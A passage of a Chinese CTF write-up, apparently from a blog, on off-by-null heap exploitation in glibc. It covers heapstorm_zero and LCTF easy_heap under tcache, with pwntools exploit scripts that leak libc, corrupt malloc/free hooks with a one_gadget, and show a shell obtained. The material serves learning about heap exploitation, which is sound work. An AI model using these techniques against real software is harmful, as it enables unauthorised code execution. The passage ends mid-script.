1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"># 此时会有 指针交叉</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line"></span><br><span class="line">###  再次 shrink chunk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line"></span><br><span class="line">view(4)</span><br><span class="line">p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">lbase = u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;)) - 0x3c4b20 - 88</span><br><span class="line">success(&apos;lbase: &apos; + hex(lbase))</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 让 heap 回到 shrink chunk 后的情况</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">32: 0x0</span><br><span class="line">48: 0x0</span><br><span class="line">64: 0x0</span><br><span class="line">80: 0x0</span><br><span class="line">96: 0x0</span><br><span class="line">112: 0x0</span><br><span class="line">128: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">512: 0x603040 —▸ 0x2aaaab097d68 (main_arena+584) ◂— 0x603040 /* u&apos;@0`&apos; */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/4xg 0x603040</span><br><span class="line">0x603040:       0x6161616161616161      0x0000000000000201</span><br><span class="line">0x603050:       0x00002aaaab097d68      0x00002aaaab097d68</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">add(0x18, &apos;A&apos; * 0x10)  # 1</span><br><span class="line">add(0x28, &apos;B&apos; * 0x20)  # 2</span><br><span class="line">add(0x38, &apos;C&apos; * 0x30)  # 3</span><br><span class="line">add(0x18, &apos;D&apos; * 0x10)  # 9</span><br><span class="line"></span><br><span class="line">pay = p64(0) + p64(0x41)</span><br><span class="line">add(0x18, pay)  # 6</span><br><span class="line">add(0x28, &apos;asd&apos;)</span><br><span class="line">add(0x38, &apos;zxc&apos;)  # 5,c</span><br><span class="line">add(0x28, &apos;qqq&apos;)  # 6,d</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a1&apos;)  # 14</span><br><span class="line">add(0x28, &apos;a2&apos;)  # 15</span><br><span class="line"></span><br><span class="line"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span><br><span class="line"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span><br><span class="line">dele(5)</span><br><span class="line">dele(14)</span><br><span class="line">dele(0xc)</span><br><span class="line"></span><br><span class="line">dele(6)</span><br><span class="line">dele(15)</span><br><span class="line">dele(0xd)</span><br><span class="line"></span><br><span class="line">add(0x28, p64(0x41))</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line"></span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8))</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8 + 0x20) + &apos;\x00&apos; * 0x10 + p64(0x41))</span><br><span class="line">add(0x38, &apos;\x00&apos; * 0x20 + p64(lbase + libc.sym[&apos;__malloc_hook&apos;] - 0x18))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 把 unsorted bin 分配掉</span><br><span class="line">add(0x18, &apos;a&apos; * 0x18)</span><br><span class="line"></span><br><span class="line"># 使用 top_chunk 分配，此时 top_chunk 位于 malloc_hook 上方， 修改 malloc_hook</span><br><span class="line">add(0x18, p64(lbase + 0xf02a4) * 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span><br><span class="line"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span><br><span class="line">dele(6)</span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0x5b bytes:</span><br><span class="line">    &quot;*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***\n&quot;</span><br><span class="line">*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***</span><br><span class="line">$ id</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;id\n&apos;</span><br><span class="line">[DEBUG] Received 0x84 bytes:</span><br><span class="line">    00000000  75 69 64 3d  31 30 30 30  28 6a 69 6e  67 29 20 67  │uid=│1000│(jin│g) g│</span><br><span class="line">    00000010  69 64 3d 31  30 30 30 28  6a 69 6e 67  29 20 e7 bb  │id=1│000(│jing│) ··│</span><br><span class="line">    00000020  84 3d 31 30  30 30 28 6a  69 6e 67 29  2c 34 28 61  │·=10│00(j│ing)│,4(a│</span><br><span class="line">    00000030  64 6d 29 2c  32 34 28 63  64 72 6f 6d  29 2c 32 37  │dm),│24(c│drom│),27│</span><br><span class="line">    00000040  28 73 75 64  6f 29 2c 33  30 28 64 69  70 29 2c 34  │(sud│o),3│0(di│p),4│</span><br><span class="line">    00000050  36 28 70 6c  75 67 64 65  76 29 2c 31  31 33 28 6c  │6(pl│ugde│v),1│13(l│</span><br><span class="line">    00000060  70 61 64 6d  69 6e 29 2c  31 32 38 28  73 61 6d 62  │padm│in),│128(│samb│</span><br><span class="line">    00000070  61 73 68 61  72 65 29 2c  39 39 39 28  64 6f 63 6b  │asha│re),│999(│dock│</span><br><span class="line">    00000080  65 72 29 0a                                         │er)·││</span><br><span class="line">    00000084</span><br><span class="line">uid=1000(jing) gid=1000(jing) 组=1000(jing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(docker)</span><br></pre></td></tr></table></figure><h2 id="另一种布局"><a href="#另一种布局" class="headerlink" title="另一种布局"></a>另一种布局</h2><p>为进一步理解 off by null , 下面以另一个 exp 的信息泄露过程为例介绍下堆的布局</p><p>来源 <a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a><br>首先分配若干个 chunk , 释放掉其中的第一个 chunk ，利用 scanf 触发堆合并构造 smallbin<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"AAA\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    add(<span class="number">0x38</span>, <span class="string">"A"</span> * <span class="number">8</span> + str(i) + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发堆合并， 构造 2 个 ， smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure></p><p>此时 chunk 10 的 pre_size 为 0x180 , pre_inused = 0.</p><p><img alt="" data-src="/imgs/off-by-null-5.png" class="lozad"><br>图中颜色定义如下<br><img alt="" data-src="/imgs/off-by-null-6.png" class="lozad"></p><p>然后分配一个 0x40 的 chunk , 此时会用 0x180 大小的 smallbin 分配，分配后应该剩下 0x140 大小的 unsorted bin (bin 切割后会保存在 unsorted bin ) , 然后利用 off by null , 修改 unsorted bin 的大小为 0x100. 此时会出现 0x40 的空隙。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配比较大的内存，使用较大的 smallbin , 分配完后利用 off by null</span></span><br><span class="line"><span class="comment"># shrink unsorted bin 的大小</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"B"</span> * <span class="number">0x30</span> + p64(<span class="number">0x120</span>))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-7.png" class="lozad"></p><p>下面在分配两个 chunk (4 5) , 然后释放 chunk 4 , 在利用 堆合并 将 fastbin 放入 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 smallbin 为 合并时的 unlink 做准备</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"C"</span> * <span class="number">0x30</span> + p32(<span class="number">0x40</span>) + <span class="string">'\n'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"P"</span> * <span class="number">0x30</span> + <span class="string">'\n'</span>)  <span class="comment"># 5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 触发堆合并，形成 smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-8.png" class="lozad"></p><p>然后把 chunk 10 释放掉， 此时系统根据 chunk 10 的 pre_size 找到 smallbin 的位置进行合并， 由于 smallbin 此时已经在链表中，所以可以成功完成合并过程中的 unlink 操作， 然后会得到一个很大的 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 释放 chunk 10, 同时触发堆合并，形成 overlap chunk , 测试 chunk 5 被 overlap</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局如下图<br><img alt="" data-src="/imgs/off-by-null-9.png" class="lozad"></p><p>通过合并我们得到了一个 0x180 大小的 smallbin , 在这个大 smallbin 里面有一个还在使用的 chunk 5 , 同时还有之前分配剩下的 0x80 大小的 smallbin. 这样我就得到了 overlap heap.</p><p>下面新建 3 个 chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">"DDD\n"</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"KKK\n"</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"EEE\n"</span>)  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure><p>由于malloc 分配内存的机制，会先从 0x80 的 smallbin 里面分配，然后才会去 0x180 的 smallbin 分配，所以内存布局如图。</p><p><img alt="" data-src="/imgs/off-by-null-10.png" class="lozad"></p><p>分配完成后 chunk 5 变成了 0x140 大小的 unsorted bin 的起始位置，于是可以利用 Puts 功能把 unsorted bin 的 指针打印出来， leak libc</p><h2 id="Tcache下的利用"><a href="#Tcache下的利用" class="headerlink" title="Tcache下的利用"></a>Tcache下的利用</h2><p>这是 lctf 的 easyheap , 用的是 libc 2.27 , 已经使用了 tcache</p><p>题目地址:<br><a href="https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap" target="_blank" rel="noopener">https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap</a> </p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>程序逻辑比较简单，漏洞位于 分配内存后，写内存时，如果 设置要 size 为 0xf8 就会 在 buf[0xf8] 写入一个字节。而 buf 是 0xf8 大小， 会有一字节的溢出。</p><p><img alt="" data-src="/imgs/off-by-null-11.png" class="lozad"></p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>由于有 tcache 的存在利用 off by null 基本不可能，所以 off by null 要想办法去溢出 非 tcache bin 和 fastbin .</p><p>每个 tcache 最多 7 个 chunk , 所以可以先填满 7 个 chunk 到 tcache 后续的 chunk 就会进入 unsorted bin 里面了。</p><p>首先分配 10 个 chunk , 释放掉后面 7 个这7 个进入 tcache , 然后释放 前面 3 个，这3 个会进入 unsorted bin , 这个过程会在 chunk 2 的 pre_size 写入 0x200.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局为</p><p><img alt="" data-src="/imgs/off-by-null-12.png" class="lozad"></p><p>接下来利用 off by null 构造 overlap chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先 释放 chunk 7 , 它会进入 unsorted bin， 设它为 C .</li><li>然后分配一个 chunk 0, 消耗一个 tcache, 为后面做准备。</li><li>然后释放 chunk 8 , 此时 tcache 还有一个空位，会进入 tcache 设它为 B. 再次分配 chunk ,此时会再次拿到 刚刚释放的 B ,保存在 索引 1 （以后称它为 chunk 1）的位置， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</li><li>然后释放 chunk 9 , 由于 pre_size 和 pre_inused ，系统会找到 C , 然后把 C unlink , 由于此时 C 在 unsorted bin 链表上，会 正常 unlink , 之后形成一个 0x300 的 unsorted bin , 里面包含了 还在使用状态的 B</li></ul><p><img alt="" data-src="/imgs/off-by-null-13.png" class="lozad"></p><p>下面利用 unsorted bin 的切割机制，让指针落入 chunk 1 ， 然后利用 Puts 打印出来， leak libc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 把剩下的 tcache 里面的 bin 消耗掉</span><br><span class="line">for i in range(7):</span><br><span class="line">    malloc(8, &apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span><br><span class="line">malloc(1, &apos;8&apos;)</span><br></pre></td></tr></table></figure><p>首先把 tcache 使用掉，然后分配一个 chunk ,此时 chunk 1 会变成 unsorted bin 的起始地址。</p><p>然后打印 chunk 1 的内容，拿到 libc 的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br></pre></td></tr></table></figure></p><p>下面利用 tcache 的机制, 让两个 一样的 bin 链入 tcache ，为后续做准备。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分配到 chunk 1, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)  <span class="comment"># 为了给后续申请腾出空间</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先分配一 个 chunk , 这时 索引 1， 9 指向同一个 chunk，设这个 chunk 的名称为 A。</li><li>然后连续释放 1 和 9 ， 此时 tcache 里面会有两个 A .</li></ul><p><img alt="" data-src="/imgs/off-by-null-14.png" class="lozad"></p><p>然后在通过修改 tcache 的指针实现分配到 __free_hook, 修改 free_hook 为 one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-15.png" class="lozad"><br>最后触发 free , 调用 one_gadget ，拿到 shell.</p><p>完整exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">"easy_heap"</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">bin = ELF(path)</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content'</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">return</span> u64((p.recvline()[:<span class="number">-1</span>]).ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 tcache 分配</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配 unsorted bin</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'7'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次让 chunk 回到 tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span 